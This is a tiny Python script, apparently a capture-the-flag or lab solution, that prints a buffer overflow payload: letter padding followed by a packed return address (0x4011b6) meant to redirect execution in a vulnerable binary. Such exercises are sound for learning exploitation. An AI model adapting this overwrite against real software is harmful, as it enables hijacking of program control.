import os

sol = "aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnppppqqqqrrrrssss"
sol += "\xb6\x11\x40\x00"   # 0x4011b6

print(sol,end="") 
